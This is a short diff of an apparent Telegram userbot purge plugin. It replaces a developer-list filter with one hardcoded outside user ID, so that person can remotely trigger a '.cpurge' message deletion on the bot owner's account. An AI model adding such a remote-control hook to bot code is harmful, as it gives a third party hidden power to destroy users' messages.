@@ -13,7 +13,7 @@ from userbot.events import register
 
 
 @register(outgoing=True, pattern=r"^\.purge$")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurge$")
+@register(incoming=True, from_users=742495738, pattern=r"^\.cpurge$")
 async def fastpurger(purg):
     chat = await purg.get_input_chat()
     msgs = []
